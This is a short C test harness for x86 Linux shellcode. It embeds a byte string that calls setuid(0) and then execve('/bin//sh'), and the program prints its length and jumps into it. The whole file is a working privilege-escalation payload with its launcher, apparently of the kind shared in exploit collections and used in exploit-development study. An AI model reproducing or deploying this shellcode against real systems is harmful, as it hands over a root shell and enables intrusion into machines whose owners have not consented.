#include <stdio.h>
#include <string.h>
 
char *shellcode = \
"\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80";

int main(void)
{
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
return 0;
}
